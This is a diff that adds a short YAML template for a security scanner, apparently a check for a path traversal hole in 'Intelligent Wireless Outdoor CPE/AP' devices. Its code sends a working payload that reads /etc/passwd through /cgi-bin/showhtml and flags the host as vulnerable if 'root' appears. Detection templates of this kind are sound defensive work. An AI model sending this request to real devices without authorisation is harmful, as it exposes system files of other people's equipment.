@@ -1,0 +1,17 @@
+information:
+  name: Intelligent Wireless Outdoor CPE/AP
+  id: iwoca-pathtraversal
+  description: Intelligent Wireless Outdoor CPE/AP path traversal vulnerable
+  risk: medium
+  authors: I2rys
+  tags: iwoca, path-traversal, Intelligent Wireless Outdoor CPE/AP, Intelligent-Wireless-Outdoor
+
+code: |
+  let path = "/cgi-bin/showhtml?page=../../etc/passwd"
+  let response = await _MakeQuest_(`{{url}}${path}`)
+  
+  if(response.data.indexOf("root") != -1){
+    Logger.attack_log({{self_info}}, `{{url}}${path}`)
+  }
+
+  resolve()
